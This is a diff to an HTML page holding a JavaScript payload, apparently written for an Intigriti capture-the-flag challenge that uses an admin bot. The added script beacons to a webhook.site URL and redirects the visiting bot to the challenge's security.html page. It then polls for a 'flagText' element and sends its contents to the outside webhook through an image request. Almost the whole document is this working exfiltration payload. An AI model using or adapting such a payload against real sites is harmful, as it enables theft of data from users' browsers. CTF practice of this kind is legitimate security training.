@@ -3,11 +3,28 @@
 <body>
 <script>
 (async () => {
-  // Signal initial execution
-  fetch("https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840?step=loaded");
+  const WH = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-  // Navigate admin bot
-  window.location = "https://challenge-0126.intigriti.io/security.html";
+  // Phase 1: beacon
+  fetch(WH + "?phase=1");
+
+  // If we're NOT on security.html, go there
+  if (!location.pathname.includes("security.html")) {
+    location.href = "https://challenge-0126.intigriti.io/security.html";
+    return;
+  }
+
+  // Phase 2: wait for DOM + JS
+  let tries = 0;
+  const iv = setInterval(() => {
+    const el = document.getElementById("flagText");
+
+    if (el || tries++ > 10) {
+      const flag = el ? el.innerText : "FLAG_NOT_FOUND";
+      new Image().src = WH + "?flag=" + encodeURIComponent(flag);
+      clearInterval(iv);
+    }
+  }, 1000);
 })();
 </script>
 </body>
